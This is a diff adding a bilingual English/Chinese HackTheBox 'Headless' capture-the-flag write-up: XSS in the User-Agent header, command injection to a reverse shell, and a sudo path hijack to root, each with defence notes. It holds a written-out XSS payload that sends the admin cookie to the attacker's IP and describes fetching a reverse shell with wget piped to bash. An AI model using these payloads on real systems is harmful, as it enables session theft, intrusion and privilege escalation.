@@ -302,3 +302,171 @@ So I decided to use busybox to make use of netcat to give me a reverse shell fro
 所以我决定使用 busybox 来利用 netcat 给我一个来自 root 的反向 shell。
 
 ![](https://miro.medium.com/v2/resize:fit:700/0*_g362aYEoB52iYy4)
+
+# [HTB] headless
+## Enumeration
+Nmap
+
+As always I started with a quick all ports Nmap scan.  
+与往常一样，我从快速的所有端口 Nmap 扫描开始。
+
+![](https://cybersec-2.gitbook.io/~gitbook/image?url=https:%2F%2F1798236562-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FeknkpLoG0ZPnMNxHet6A%252Fuploads%252F13BRJVZ6y5a63HTUHauS%252Fimage.png%3Falt=media%26token=b718ce3b-f85b-43d2-8bf2-4226339b2825&width=768&dpr=4&quality=100&sign=d3d1f6ef15a85f1c28a1d042decbd9666d713562690bde67e4fa4a450336d46e)
+
+With the open ports known I did a service and version check on those ports.  
+在已知开放端口的情况下，我对这些端口进行了服务和版本检查。
+
+![](https://cybersec-2.gitbook.io/~gitbook/image?url=https:%2F%2F1798236562-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FeknkpLoG0ZPnMNxHet6A%252Fuploads%252FZYjgGjI4Hm5871olGAGz%252Fimage.png%3Falt=media%26token=9fa72530-4ee0-4075-b3b4-53ab31029a5d&width=768&dpr=4&quality=100&sign=99fa450b8b22e3276a2d03dfcbddf5c376741225ef569f97c04f2437add5d94d)
+
+On port **5000** there is a Flask web server.  
+在端口 5000 上有一个 Flask Web 服务器。
+
+With the web server known I ran FeroxBuster to see if there was anything of value.  
+在已知 Web 服务器的情况下，我运行了 FeroxBuster 以查看是否有任何有价值的东西。
+
+![](https://cybersec-2.gitbook.io/~gitbook/image?url=https:%2F%2F1798236562-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FeknkpLoG0ZPnMNxHet6A%252Fuploads%252FK75qhyr8a993FYanVyJE%252Fimage.png%3Falt=media%26token=abb71993-2af1-4418-b4d3-7c2430d8c848&width=768&dpr=4&quality=100&sign=337ada24c8611535f4620af6447e42f75fadd9bcea16795a867dd605b3377031)
+
+The Dashboard item looks interesting, though a 500 error indicated an Internal Server Error.  
+仪表板项看起来很有趣，尽管 500 错误表示内部服务器错误。
+
+Web Enumeration
+
+There is a website running on the python server that shows a splash page with a count down with a link to another page **/support**.  
+python 服务器上运行着一个网站，它显示了一个带有倒计时的启动页面，其中包含指向另一个页面 /support 的链接。
+
+![](https://cybersec-2.gitbook.io/~gitbook/image?url=https:%2F%2F1798236562-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FeknkpLoG0ZPnMNxHet6A%252Fuploads%252FA2PwARTmkaglY1eRe5bS%252Fimage.png%3Falt=media%26token=05d66c02-2c6e-49d4-aace-51c9181c03cc&width=768&dpr=4&quality=100&sign=d9f0206803c7e2f7aca85946089f4c5a8d760b3fd1356638356222fc28fdaaab)
+
+Trying out the **/dashboard** directory found using FeroxBuster returns an "Unauthorised" page.  
+尝试使用 FeroxBuster 找到的 /dashboard 目录会返回一个“未经授权”的页面。
+
+![](https://cybersec-2.gitbook.io/~gitbook/image?url=https:%2F%2F1798236562-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FeknkpLoG0ZPnMNxHet6A%252Fuploads%252FQcRKXZoW2Zumr70pGgzs%252Fimage.png%3Falt=media%26token=f86bf272-adab-4105-a8fe-1171ffdceabe&width=768&dpr=4&quality=100&sign=4a2ae59b6cf14f17690ac0f6aa2350fa7c6022fc7c0bb211ba82148553e44c1b)
+
+On the **/support** page there is a contact form.  
+在 /support 页面上有一个联系表单。
+
+![](https://cybersec-2.gitbook.io/~gitbook/image?url=https:%2F%2F1798236562-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FeknkpLoG0ZPnMNxHet6A%252Fuploads%252FViMrJd59NApi7RLfa4VK%252Fimage.png%3Falt=media%26token=0a7263cb-d756-4a5d-a189-087b73c56e7c&width=768&dpr=4&quality=100&sign=aa8102229d7a858a440fbc6b883fca34233869070f4b3b28f914289d0d7f5404)
+
+Within the HTTP request body there is a cookie being set to determine if someone is an admin.  
+在 HTTP 请求正文中，设置了一个 cookie 来确定某人是否是管理员。
+
+![](https://cybersec-2.gitbook.io/~gitbook/image?url=https:%2F%2F1798236562-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FeknkpLoG0ZPnMNxHet6A%252Fuploads%252FCw0QFbzDMoPfi2w19YUo%252Fimage.png%3Falt=media%26token=9ec3a20c-a15f-4793-a402-77390f7ccbce&width=768&dpr=4&quality=100&sign=e0032ba25bf04218676a4780436046fa4b3563373b805a2d38fddc04a3ddd1a8)
+
+XSS
+
+Using XSS it is possible to capture an admin cookie, this can then be injected to the HTTP requests to act as an admin for the web app. The concept here is to force the web server to request a resource from our web server and request a cookie from the requester. Using this method it's possible to steal an admin cookie.  
+使用 XSS 可以捕获管理 cookie，然后可以将其注入 HTTP 请求以充当 Web 应用程序的管理员。这里的概念是强制 Web 服务器从我们的 Web 服务器请求资源，并向请求者请求 cookie。使用此方法可以窃取管理cookie。
+
+Copy
+
+```
+<script>document.location='http://10.10.14.149?='+document.cookie;</script>
+```
+
+![](https://cybersec-2.gitbook.io/~gitbook/image?url=https:%2F%2F1798236562-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FeknkpLoG0ZPnMNxHet6A%252Fuploads%252FHlr070e8JWuQc9OVGaQH%252FInjection.PNG%3Falt=media%26token=4ce334be-f006-44d3-a6d3-b278ee1c2b1a&width=768&dpr=4&quality=100&sign=983f964bd7b5fe913f05ba88173940cb8c5ad882232387b5326c10c4ffb2a042)
+
+Using this payload triggers an error from the server.  
+使用此有效负载会触发来自服务器的错误。
+
+The < and > characters are blacklisted, this is what triggers the error  
+<和>字符被列入黑名单，这就是触发错误的原因
+
+![](https://cybersec-2.gitbook.io/~gitbook/image?url=https:%2F%2F1798236562-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FeknkpLoG0ZPnMNxHet6A%252Fuploads%252F89VAl2EpYkI1lfHteTMC%252FRe_send_injection.PNG%3Falt=media%26token=3028eef1-704f-46cf-ad52-410ccbffdf73&width=768&dpr=4&quality=100&sign=643e080dd17070f21f4235ce2b2fc46f77e46fab13ed0e599a60ea68e6654cb1)
+
+XSS in User Agent Header 用户代理标头中的 XSS
+
+In this error response page we can see the **user agent** is being presented back, this marks the injection point. Where the user agent is being rendered client side it may then be possible to inject something to the user agent, and have that render upon reloading.  
+在此错误响应页面中，我们可以看到用户代理正在显示，这标记了注入点。如果用户代理是客户端渲染的，则可以向用户代理注入某些内容，并在重新加载时进行渲染。
+
+I hit refresh on this page, intercepted and updated the user agent to the below payload:  
+我在此页面上点击刷新，拦截并将用户代理更新为以下有效负载：
+
+Copy
+
+```
+<script>document.location='http://10.10.14.149?='+document.cookie;</script>
+```
+
+Once I resent the request I got a hit back to my web server.  
+一旦我重新发送请求，我的网络服务器就会受到打击。
+
+![](https://cybersec-2.gitbook.io/~gitbook/image?url=https:%2F%2F1798236562-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FeknkpLoG0ZPnMNxHet6A%252Fuploads%252FbO4KuRGFr0r8qQz6qHdi%252FXSS_Admin_Cookie.PNG%3Falt=media%26token=88c2a01f-3d8d-4e86-9a8a-2dc4e580b8ab&width=768&dpr=4&quality=100&sign=c90e75395f77bce1237c17b2ec8ce4fa4eb8d75161a8653b1fcb672bed43bc85)
+
+**Defence**: To mitigate this, developers should properly escape all untrusted data based on the context (HTML, JavaScript, URL, etc.) using libraries designed for this purpose. For User-Agent logging or display, applying HTML entity encoding along with ensuring that escaping is used where appropriate.  
+防御：为了缓解这种情况，开发人员应使用为此目的设计的库，根据上下文（HTML、JavaScript、URL 等）正确转义所有不受信任的数据。对于 User-Agent 日志记录或显示，应用 HTML 实体编码，同时确保在适当的情况下使用转义。
+## Getting Shell
+Dashboard
+
+With the admin cookie stolen I could get into the /dashboard part of the app.  
+随着管理cookie被盗，我可以进入应用程序的/dashboard部分。
+
+![](https://cybersec-2.gitbook.io/~gitbook/image?url=https:%2F%2F1798236562-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FeknkpLoG0ZPnMNxHet6A%252Fuploads%252FaWAhoWPUDcusrDgSKTbJ%252FAdmin_Dashboard.PNG%3Falt=media%26token=6c4d365f-050c-4752-b04d-ff93f56587eb&width=768&dpr=4&quality=100&sign=4cd7f07c1f9a8496d4ab431c70819bee9890c91bc447e0eab4550400c02efdf4)
+
+Intercepting the **Generate Report** request showed the date in the body of the POST request. This wasn't escaped properly and command injection was possible.  
+截获“生成报告”请求时，会在 POST 请求的正文中显示日期。这没有正确转义，命令注入是可能的。
+
+![](https://cybersec-2.gitbook.io/~gitbook/image?url=https:%2F%2F1798236562-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FeknkpLoG0ZPnMNxHet6A%252Fuploads%252FMfQwPRNRe3uVgG3g3AF0%252FCommand_Injection.PNG%3Falt=media%26token=1db9963e-c9a4-4624-89b8-17d1bdb736fd&width=768&dpr=4&quality=100&sign=29c1ddea48e08ec9d9ba53bffbe336863f60b5c80d97e31423b75382a880a8fc)
+
+![](https://cybersec-2.gitbook.io/~gitbook/image?url=https:%2F%2F1798236562-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FeknkpLoG0ZPnMNxHet6A%252Fuploads%252F4iNb76DTOUpS0hHf3Nz4%252FConfirming_Injection.PNG%3Falt=media%26token=b2bb329f-0ab7-44fe-9814-9caf7ebe2f54&width=768&dpr=4&quality=100&sign=01c4fc633f599942beb38ad2ad91d22cf1f1d28064582014dc828a80899439e1)
+
+With command injection established a simple **bash** reverse shell payload could be fetched using wget and piped to bash for execution.  
+通过建立命令注入，可以使用 wget 获取简单的 bash 反向 shell 有效负载，并通过管道传输到 bash 执行。
+
+![](https://cybersec-2.gitbook.io/~gitbook/image?url=https:%2F%2F1798236562-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FeknkpLoG0ZPnMNxHet6A%252Fuploads%252Ff68ZfvMLBydCQ4aFXd0A%252FReverse_Shell.PNG%3Falt=media%26token=db4f2f03-9760-433b-a077-c11787913920&width=768&dpr=4&quality=100&sign=f4b0f752b21e2db54a363bb75f42e5f10e9495a9e82a3a38debd1ab8ec579d0e)
+
+The user flag was located in the **dvir** users home directory.  
+用户标志位于 dvir users 主目录中。
+
+![](https://cybersec-2.gitbook.io/~gitbook/image?url=https:%2F%2F1798236562-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FeknkpLoG0ZPnMNxHet6A%252Fuploads%252FvDWhaEYcjYMZJ2ueTbcd%252FUser_Flag.PNG%3Falt=media%26token=a63af676-1cc4-4d9a-86e8-d5326c4ba653&width=768&dpr=4&quality=100&sign=fccdb65e458dc4d09fb17e1727623125d606001f678302d0fac336ff53130ddf)## 
+
+
+Privilege Escalation 权限提升
+
+Sudo -l
+
+The **dvir** user has sudo permissions over a binary called **syscheck.**  
+dvir 用户对名为 syscheck 的二进制文件具有 sudo 权限。
+
+![](https://cybersec-2.gitbook.io/~gitbook/image?url=https:%2F%2F1798236562-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FeknkpLoG0ZPnMNxHet6A%252Fuploads%252FGNGJKH8pPmvGGa0bGXNp%252Fsudo_l.PNG%3Falt=media%26token=92f2062d-e8d2-4d17-be82-12d6ec013da0&width=768&dpr=4&quality=100&sign=4479c89795cbe516e108abf10c09262f5514abe8d51d8f04df22a1f7b8e444f5)
+
+When run with sudo the following is output.  
+使用 sudo 运行时，将输出以下内容。
+
+![](https://cybersec-2.gitbook.io/~gitbook/image?url=https:%2F%2F1798236562-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FeknkpLoG0ZPnMNxHet6A%252Fuploads%252F1dWJhROSl2MC3zAAZefJ%252Fimage.png%3Falt=media%26token=63b5fd3b-b2ca-4abe-8be3-6ca9d869f28d&width=768&dpr=4&quality=100&sign=bdd99426fa52ec086fc7ce2031bd4c0caa32e4b1f8996f01e593334f88fbc22b)
+
+The mention of a database service starting warrents further investigation. I tried to see if there was a file being called by running the binary with **strace** but it wasnt installed on the box. Using **strings** on the binary yielded the result I was looking for though.  
+提到数据库服务启动需要进一步调查。我试图通过运行带有 strace 的二进制文件来查看是否正在调用文件，但它没有安装在盒子上。不过，在二进制文件上使用字符串产生了我正在寻找的结果。
+
+![](https://cybersec-2.gitbook.io/~gitbook/image?url=https:%2F%2F1798236562-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FeknkpLoG0ZPnMNxHet6A%252Fuploads%252F84oe1SSxQH1WTSCU0Cno%252Fsyscheck.PNG%3Falt=media%26token=576d56fe-e3b0-406c-a6ca-5930fffc1169&width=768&dpr=4&quality=100&sign=3e453856de8154003e5f1af4a98988dc3414d3c139b739debfb38b3d4b150d50)
+
+The binary is loading a file called **initdb.sh** if a database isnt running, curiously it specifies the binary to load with ./ pre-pended.  
+如果数据库没有运行，二进制文件正在加载一个名为 initdb.sh 的文件，奇怪的是，它指定要加载的二进制文件，并预先挂载 ./。
+
+Copy
+
+```
+if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
+  /usr/bin/echo "Database service is not running. Starting it..."
+  ./initdb.sh 2>/dev/nul
+```
+
+This means that the script will look to load **initdb.sh** from the current working directory, meaning a path hijack attack is possible.  
+这意味着脚本将寻求从当前工作目录加载 initdb.sh，这意味着路径劫持攻击是可能的。
+
+Path Hijack
+
+There is many payloads that could be used here, I chose to go with an easy option and modify the permissions on the /bin/bash binary making it a **SUID** binary. Taking this approach I can then simply run the updated /bin/bash binary and drop into a root shell.  
+这里可以使用许多有效负载，我选择一个简单的选项并修改 /bin/bash 二进制文件的权限，使其成为 SUID 二进制文件。采用这种方法，我可以简单地运行更新的 /bin/bash 二进制文件并放入 root shell。
+
+![](https://cybersec-2.gitbook.io/~gitbook/image?url=https:%2F%2F1798236562-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FeknkpLoG0ZPnMNxHet6A%252Fuploads%252FRw83LJVNADoWWOn0cdZs%252FSet_UID_bash.PNG%3Falt=media%26token=d51033de-9816-47dd-8ef7-227b7ed9ac21&width=768&dpr=4&quality=100&sign=8fc7e10e26e14ca09f7ce92988e324664f07c468e3cb99447c5404682957bdf8)
+
+From here a simple **/bin/bash -p** drops me into a root shell and I can grab the root flag.  
+从这里，一个简单的 /bin/bash -p 将我放入 root shell 中，我可以获取根标志。
+
+The **-p** flag in the above command starts bash in "_privileged mode_". In simple terms, this means that the SUID binary will run as the owner of said binary, not the user invoking it. That's how we get a root shell instead of one as the current user.  
+上述命令中的 -p 标志在“特权模式”下启动 bash。简单来说，这意味着 SUID 二进制文件将作为所述二进制文件的所有者运行，而不是作为调用它的用户运行。这就是我们获得 root shell 而不是当前用户的方式。
+
+![](https://cybersec-2.gitbook.io/~gitbook/image?url=https:%2F%2F1798236562-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FeknkpLoG0ZPnMNxHet6A%252Fuploads%252FuDJCld4fld3plRe0OFp0%252Froot_flag.PNG%3Falt=media%26token=2f7676b4-bdbe-4ca3-b335-68e8c5afb50a&width=768&dpr=4&quality=100&sign=809526eb7dcd3a16a7824c8c1a86c35260a561d3f3b955fff53cbb35c3f264a7)
+
+**Defence**: Where binaries can be run as Sudo, ensure that absolute file paths are used. In this case if the initdb.sh file was being called from say **/usr/bin** the **dvir** user presumably wouldn't have had access to write to that folder and couldn't have hijacked paths to escalate privileges.  
+防御：如果二进制文件可以作为 Sudo 运行，请确保使用绝对文件路径。在这种情况下，如果从 /usr/bin 调用 initdb.sh 文件，则 dvir 用户可能无权写入该文件夹，也无法劫持路径以提升权限。
+## Hint
+sudo可以执行的脚本中带有‘./’路径的可执行文件，'./'一般指当前目录下的文件，但是在可执行文件中，这个当前目录指的就是执行该脚本的位置，你可以在你有权限读写的目录执行这个脚本，他会访问你当前目录下的指定文件，这样你就可以伪造文件了。0
